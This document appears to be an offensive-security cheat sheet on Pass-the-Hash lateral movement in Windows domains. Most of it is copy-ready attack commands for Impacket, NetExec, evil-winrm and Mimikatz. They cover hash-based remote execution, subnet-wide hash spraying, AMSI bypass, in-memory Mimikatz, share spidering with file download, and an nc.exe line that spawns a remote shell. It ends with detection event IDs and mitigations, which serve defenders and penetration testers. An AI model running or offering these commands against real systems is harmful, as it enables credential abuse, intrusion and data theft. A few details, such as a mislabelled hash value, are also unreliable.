# Pass-the-Hash (PtH)

Pass-the-Hash uses NTLM password hashes to authenticate to remote systems without knowing the plaintext password. Since NTLM authentication only requires the hash, a captured hash from `lsass`, SAM, NTDS.dit, or a cached credential can be replayed directly.

## How It Works

The NTLMv1/v2 challenge-response protocol uses the NTLM hash as the secret. By providing the hash to an authentication library (Windows `Secur32.dll`, Impacket's protocol implementations), the attacker completes the challenge-response without ever needing the plaintext.

## Requirements

| Requirement | Detail |
|-------------|--------|
| Privileges | Local admin on target (for most techniques) |
| Hash Type | NTLM hash (LM hash usually disabled) |
| Protocol | SMB, WinRM, WMI, RPC |
| Mitigation | KB2871997 / Credential Guard blocks to LSASS |
| UAC Remote | Local admin token filtered unless `LocalAccountTokenFilterPolicy` is set |

**Windows 8.1/Server 2012R2+**: Restricted Admin mode and Credential Guard can prevent PtH for local accounts but domain accounts with NTLM still work.

---

## Impacket Tools

### wmiexec.py — Semi-interactive shell over WMI

```
# Password authentication
wmiexec.py DOMAIN/user:'Password123!'@192.168.1.100

# NTLM hash authentication
wmiexec.py -hashes LM:NTLM DOMAIN/user@192.168.1.100
wmiexec.py -hashes :aad3b435b51404eeaad3b435b51404ee DOMAIN/admin@192.168.1.100

# Using blank LM hash (common)
wmiexec.py -hashes :aad3b435b51404eeaad3b435b51404ee ADMINISTRATOR@target.local

# Share selection (default ADMIN$)
wmiexec.py -share ADMIN$ DOMAIN/user@target

# Execute single command
wmiexec.py DOMAIN/user:pass@target 'whoami'
```

**OPSEC**: wmiexec creates a temporary VBS file on the target (`%TEMP%\\*.vbs`) and executes it via WMI — a common signature.

### smbexec.py — Semi-interactive shell over SMB (services.exe)

```
# Password authentication
smbexec.py DOMAIN/user:'Password123!'@192.168.1.100

# Hash authentication
smbexec.py -hashes :NTLM_HASH DOMAIN/user@192.168.1.100

# Output as command (no BATCH wrapper)
smbexec.py -nooutput DOMAIN/user@target "whoami"

# Mode selection (share, server)
smbexec.py -mode SERVER DOMAIN/user@target
```

**OPSEC**: smbexec creates a temporary Windows service named with a random string (BTOBTO-). Service creation (4697/7045) is heavily monitored.

### psexec.py — Impacket's PsExec implementation

```
# Password authentication
psexec.py DOMAIN/user:'Password123!'@192.168.1.100

# Hash authentication
psexec.py -hashes :NTLM_HASH DOMAIN/user@192.168.1.100

# Remote command execution
psexec.py DOMAIN/user@target "whoami"

# Use specific service name (stealth)
psexec.py -service-name LegitSvc DOMAIN/user@target "whoami"
```

**OPSEC**: Same service-creation footprint as smbexec. Always creates/removes a service. Using `-service-name` doesn't avoid detection, only blends the name.

### dcomexec.py — DCOM execution (MMC, ShellBrowserWindow)

```
# DCOM MMC (most reliable)
dcomexec.py -object MMC DOMAIN/user:'pass'@target

# ShellBrowserWindow
dcomexec.py -object ShellBrowserWindow DOMAIN/user@target -hashes :NTLM

# Execute command
dcomexec.py DOMAIN/user:pass@target "powershell -enc BASE64"
```

**OPSEC**: DCOM uses RPC and does not create services, making it somewhat stealthier than psexec/smbexec.

### atexec.py — Scheduled Task execution via AT

```
# Password auth
atexec.py DOMAIN/user:'Password123!'@192.168.1.100

# Hash auth
atexec.py -hashes :NTLM_HASH DOMAIN/user@192.168.1.100

# Run command
atexec.py DOMAIN/user:pass@target "powershell whoami"
```

**OPSEC**: Creates a scheduled task with predictable names (via AT — deprecated on modern Windows).

---

## NetExec (formerly CrackMapExec)

```
# Command execution via SMB
nxc smb 192.168.1.100 -u admin -H aad3b435b51404eeaad3b435b51404ee -x whoami

# Command execution via WinRM
nxc winrm 192.168.1.100 -u admin -H aad3b435b51404eeaad3b435b51404ee -x whoami

# PowerShell command
nxc smb 192.168.1.100 -u admin -H NTLM_HASH -X 'Get-Service'

# Local authentication (non-domain)
nxc smb target -u admin -H NTLM --local-auth -x whoami

# Execute using WMI method
nxc smb target -u admin -H NTLM --exec-method wmiexec -x whoami

# Module execution (enumeration, mimikatz)
nxc smb target -u admin -H NTLM -M enum_av
nxc smb target -u admin -H NTLM -M mimikatz

# SMB share browsing with hash
nxc smb target -u admin -H NTLM --shares

# Spider shares for files
nxc smb target -u admin -H NTLM -M spider_plus -o DOWNLOAD_FLAG=True

# Password spraying with hash (use -H)
nxc smb subnet -u users.txt -H NTLM_HASH --continue-on-success
```

**OPSEC**: NetExec allows choosing the execution method, making it flexible. The `--exec-method wmiexec` avoids service creation.

---

## evil-winrm — WinRM shell with PtH

```
# Hash authentication (NTLM hash)
evil-winrm -i 192.168.1.100 -u admin -H aad3b435b51404eeaad3b435b51404ee

# Specify domain
evil-winrm -i target -u DOMAIN\\admin -H NTLM_HASH

# With SSL (WinRM over HTTPS)
evil-winrm -i target -u admin -H NTLM_HASH -S

# Ignore certificate validation
evil-winrm -i target -u admin -H NTLM_HASH -S -k

# Disable WinRM default path check (evasion)
evil-winrm -i target -u admin -H NTLM_HASH -NoPathCheck

# Upload and download files
evil-winrm -i target -u admin -H HASH
*Evil-WinRM* PS> upload local.txt
*Evil-WinRM* PS> download remote.txt

# Load PowerShell script from memory
*Evil-WinRM* PS> menu
*Evil-WinRM* PS> Bypass-4MSI
*Evil-WinRM* PS> Invoke-Mimikatz.ps1

# Execute with local account
evil-winrm -i target -u admin -H HASH -L
```

**OPSEC**: WinRM operates over HTTP/HTTPS (5985/5986) and is commonly used for legitimate administration. It blends into normal traffic better than SMB. However, many orgs log WinRM operations via PowerShell logging (Event ID 4103, 4104).

---

## Mimikatz sekurlsa::pth

Mimikatz can inject a hash into a new process, performing PtH at the OS level on a compromised host.

```
# Pass-the-Hash to launch cmd as the target user
mimikatz # sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:NTLM_HASH /run:cmd

# Pass-the-Hash for PowerShell
mimikatz # sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:NTLM_HASH /run:powershell.exe

# With AES keys (if available)
mimikatz # sekurlsa::pth /user:admin /domain:DOMAIN /aes256:AES256_KEY /run:cmd

# Without LM hash
mimikatz # sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:NTLM_HASH

# Target specific process
mimikatz # sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:"c:\tools\nc.exe target 4444 -e cmd"
```

**What happens**: Mimikatz patches `NTLM SSP` to accept the supplied hash, opens a new process as the target user. Any NTLM authentication from that process will use the injected hash.

```
# From the spawned cmd.exe, access remote resources
# (Hash is cached for the session)
net use \\target\IPC$ /user:DOMAIN\admin
dir \\target\c$
psexec \\target cmd
```

**OPSEC**:
- `sekurlsa::pth` creates a new logon session (Event ID 4624, LogonType 9)
- The spawned process runs with `NewCredentials` logon
- Mimikazi loads `sekurlsa` DLL — detectable by AV/EDR
- Can use `misc::cmd` instead to avoid spawning a new window

---

## Windows Native Tools

### PowerShell Invoke-WmiMethod with hash (via runas/netonly)

Windows does not natively allow PtH without Mimikatz, but you can use `runas /netonly` with credentials:

```
# Run process with network credentials only (not local)
runas /netonly /user:DOMAIN\admin "cmd.exe"

# From that session, use native WMI
wmic /node:target process call create "cmd /c whoami > C:\out.txt"

# PowerShell via .NET with alternate credentials
$secpassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\admin', $secpassword)
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami }
```

---

## Detection

| Event ID | Source | Indication |
|----------|--------|------------|
| 4624 | Security | LogonType 3 (Network) from unusual source |
| 4624 | Security | LogonType 9 (NewCredentials) from sekurlsa::pth |
| 4648 | Security | Explicit credentials used (runas) |
| 4672 | Security | Special privileges assigned (SeTcbPrivilege) |
| 5140 | Security | SMB share access to ADMIN$ or IPC$ |
| 5145 | Security | SMB file share access to ADMIN$ |
| 4697 | Security | Service creation (smbexec/psexec) |
| 7045 | System | Service install (smbexec/psexec) |
| 4103 | PowerShell | PowerShell module logging |
| 4104 | PowerShell | Script block logging |

**Detection logic**:
- Multiple `4624` LogonType 3 from a single source to many targets in short time = lateral movement
- `5140/5145` accessing `ADMIN$` or `IPC$` followed by `4697/7045` = PsExec-like activity
- NTLM authentication with same hash from multiple source hosts = PtH
- Event ID 4648 paired with 4624 LogonType 3 = credential theft

## Mitigation

| Control | Effectiveness |
|---------|---------------|
| KB2871997 | Blocks PtH for local accounts; domain accounts still work |
| Credential Guard | Protects LSASS, prevents hash extraction |
| LSA Protection | Prevents Mimikatz from reading LSASS |
| Restricted Admin | RDP PtH prevention |
| Network segmentation | Limits lateral pathways |
| Managed Service Accounts | Prevents hash caching |
| Monitoring NTLM | Detect anomalous NTLM auth patterns |
| Enable Windows Firewall | Block unnecessary SMB/WMI/WinRM access |
